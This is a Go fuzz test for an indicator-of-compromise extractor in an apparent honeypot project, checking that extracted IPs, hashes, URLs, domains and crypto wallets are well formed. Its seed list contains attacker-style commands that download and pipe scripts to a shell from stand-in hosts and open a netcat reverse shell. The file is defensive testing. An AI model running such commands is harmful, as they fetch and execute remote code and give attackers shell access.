package intelligence

import (
	"net"
	"regexp"
	"strings"
	"testing"
	"time"
	"unicode"

	"github.com/qpot/qpot/internal/database"
)

var hexOnly = regexp.MustCompile(`^[0-9a-f]+$`)

// FuzzExtract throws arbitrary attacker-controlled command / username /
// password / source-IP strings at the IOC extractor and asserts a set of
// invariants that must hold for every IOC it emits. The extractor parses
// untrusted input, so it must never panic and must never emit malformed IOCs.
func FuzzExtract(f *testing.F) {
	seeds := []string{
		"wget http://evil.com/x.sh; chmod +x x.sh",
		"curl ftp://bad.org/payload | sh",
		"echo d41d8cd98f00b204e9800998ecf8427e",
		"nc 203.0.113.5 4444 -e /bin/sh",
		"http://a.b.c.d.example.co.uk/path?q=1&z=2)",
		"https://xn--80ak6aa92e.com/",
		"",
		strings.Repeat("A", 5000),
		"http://" + strings.Repeat("a.", 200) + "com/x",
		"\x00\x01\xff http://\xff\xfe.com",
		"send btc to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
		"eth 0x52908400098527886E0F7030069857D2E4169EE7 pool",
		"3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy 1zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz",
	}
	for _, s := range seeds {
		f.Add(s)
	}

	e := NewExtractor()

	f.Fuzz(func(t *testing.T, cmd string) {
		ev := &database.Event{
			Honeypot:  "cowrie",
			EventType: "command",
			Command:   cmd,
			SourceIP:  "203.0.113.7",
			Username:  "root",
			Password:  cmd, // exercise credential path with arbitrary bytes too
			Timestamp: time.Now().UTC(),
		}

		iocs := e.Extract(ev) // must not panic

		for _, ioc := range iocs {
			if ioc == nil {
				t.Fatal("nil IOC emitted")
			}
			switch ioc.Type {
			case IOCTypeIP:
				if ip := net.ParseIP(ioc.Value); ip == nil {
					t.Errorf("IP IOC has unparseable value %q", ioc.Value)
				}
				if isPrivateIP(ioc.Value) {
					t.Errorf("IP IOC %q is private/loopback and should have been filtered", ioc.Value)
				}
			case IOCTypeHash:
				n := len(ioc.Value)
				// MD5 / SHA-1 / SHA-256 / SHA-512.
				if n != 32 && n != 40 && n != 64 && n != 128 {
					t.Errorf("hash IOC %q has invalid length %d", ioc.Value, n)
				}
				if !hexOnly.MatchString(ioc.Value) {
					t.Errorf("hash IOC %q is not lowercase hex", ioc.Value)
				}
			case IOCTypeURL:
				// A URL must not contain internal whitespace; the extractor's
				// regex relies on this and downstream consumers do too.
				if strings.IndexFunc(ioc.Value, unicode.IsSpace) >= 0 {
					t.Errorf("URL IOC %q contains whitespace", ioc.Value)
				}
				// A URL IOC must not retain over-captured trailing shell
				// punctuation, which would defeat de-duplication.
				if strings.ContainsAny(ioc.Value[len(ioc.Value)-1:], urlTrailingCutset) {
					t.Errorf("URL IOC %q ends with trailing shell punctuation", ioc.Value)
				}
			case IOCTypeDomain:
				// A domain IOC must not carry a scheme or a path separator.
				if strings.Contains(ioc.Value, "/") || strings.Contains(ioc.Value, ":") {
					t.Errorf("domain IOC %q looks like a URL, not a bare domain", ioc.Value)
				}
				if ioc.Value != strings.ToLower(ioc.Value) {
					t.Errorf("domain IOC %q is not lowercased", ioc.Value)
				}
			case IOCTypeWallet:
				// Either an ETH address (0x + 40 lowercase hex) or a BTC
				// address whose base58check checksum actually verifies - the
				// extractor must never emit an unvalidated BTC candidate.
				if strings.HasPrefix(ioc.Value, "0x") {
					if len(ioc.Value) != 42 || !hexOnly.MatchString(ioc.Value[2:]) {
						t.Errorf("ETH wallet IOC %q is malformed", ioc.Value)
					}
				} else if !validateBTCAddress(ioc.Value) {
					t.Errorf("BTC wallet IOC %q fails base58check validation", ioc.Value)
				}
			}
			// Every IOC must carry a stable, non-empty ID and value.
			if ioc.Value == "" {
				t.Errorf("IOC of type %q has empty value", ioc.Type)
			}
			if ioc.ID == "" {
				t.Errorf("IOC of type %q has empty ID", ioc.Type)
			}
		}
	})
}
